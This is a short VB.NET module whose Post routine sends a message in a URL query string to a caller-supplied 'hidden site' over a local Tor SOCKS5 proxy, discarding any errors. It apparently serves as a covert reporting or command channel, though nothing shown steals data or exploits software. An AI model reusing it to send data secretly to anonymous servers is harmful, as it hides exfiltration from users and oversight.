Imports System.Net
Imports com.LandonKey.SocksWebProxy
Imports System.Threading
Module Connect
    Public Sub Post(ByVal msg As String, ByVal hiddensite As String)
        Try
            Console.WriteLine(msg)
            Dim request As HttpWebRequest
            Dim response As HttpWebResponse
            Dim config As com.LandonKey.SocksWebProxy.Proxy.ProxyConfig = New com.LandonKey.SocksWebProxy.Proxy.ProxyConfig(IPAddress.Loopback, 8181, IPAddress.Loopback, 9150, com.LandonKey.SocksWebProxy.Proxy.ProxyConfig.SocksVersion.Five)
            request = CType(WebRequest.Create("http://" & hiddensite & "/index.php?" & msg), HttpWebRequest)
            request.Proxy = New SocksWebProxy(config)
            request.KeepAlive = False
            response = CType(request.GetResponse, HttpWebResponse)
        Catch : End Try
    End Sub
End Module
